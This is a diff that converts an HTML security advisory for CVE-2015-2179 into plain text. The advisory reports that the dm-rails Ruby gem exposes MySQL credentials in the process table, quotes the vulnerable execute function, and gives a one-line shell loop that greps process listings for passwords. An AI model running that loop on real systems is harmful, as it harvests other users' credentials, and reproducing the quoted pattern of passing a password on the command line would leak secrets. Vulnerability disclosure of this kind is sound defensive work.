@@ -1,33 +1,24 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 115&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; xaviershay-dm-rails v0.10.3.8 mysql credential exposure&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-02-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://rubygems.org/gems/xaviershay-dm-rails">https://rubygems.org/gems/xaviershay-dm-rails</a>"&gt;<a href="https://rubygems.org/gems/xaviershay-dm-rails&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://rubygems.org/gems/xaviershay-dm-rails&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Martin Gamsjaeger, Dan Kubb&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-02-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:notreal@rhnh.net">notreal@rhnh.net</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;This gem provides the railtie that allows datamapper to hook into rails3 and thus behave like a rails framework component. Just like activerecord does in rails, dm-rails uses the railtie API to hook into rails. The two are actually hooked into rails almost identically.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The problem is with the execute function exposing the user credentials to the process table.
-</p><p>Lines 169 - 177 in /datamapper/dm-rails/blob/master/lib/dm-rails/storage.rb:
- 
-</p><p>   def execute(statement)
-</p><pre>
-          system(
-            &amp;#039;mysql&amp;#039;,
-            (username.blank? ? &amp;#039;&amp;#039; : &amp;quot;--user=<strong>{username}&amp;quot;),
-            (password.blank? ? &amp;</strong>039;&amp;#039; : &amp;quot;--password=<strong>{password}&amp;quot;),
-            &amp;</strong>039;-e&amp;#039;,
-            statement
-          )
-        end&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-2179&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=115"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ &lt;span style="color: #b1b100;"&gt;while&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900; font-weight: bold;"&gt;true&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;do&lt;/span&gt; ps &lt;span style="color: #339933;"&gt;-&lt;/span&gt;ef &lt;span style="color: #339933;"&gt;|&lt;/span&gt;grep &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;p&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;assword&lt;span style="color: #339933;"&gt;;&lt;/span&gt; done&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=115">http://www.vapid.dhs.org/advisory.php?v=115</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=115&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=115&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-</pre>
-<p>&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 115
+Title: xaviershay-dm-rails v0.10.3.8 mysql credential exposure
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-02-17
+Download Site: https://rubygems.org/gems/xaviershay-dm-rails
+Vendor:Martin Gamsjaeger, Dan Kubb
+Vendor Notified: 2015-02-17
+Vendor Contact: notreal@rhnh.net
+Description: This gem provides the railtie that allows datamapper to hook into
+rails3 and thus behave like a rails framework component. Just like activerecord
+does in rails, dm-rails uses the railtie API to hook into rails. The two are
+actually hooked into rails almost identically.
+Vulnerability:
+The problem is with the execute function exposing the user credentials to the
+process table. Lines 169 - 177 in /datamapper/dm-rails/blob/master/lib/dm-
+rails/storage.rb: def execute(statement) system( 'mysql', (username.blank? ? ''
+: "--user=#{username}"), (password.blank? ? '' : "--password=#{password}"), '-
+e', statement ) end
+CVE-2015-2179
+JSON:Export
+Exploit Code:
+   1. $ while (true) do ps -ef |grep [p]assword; done
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=115
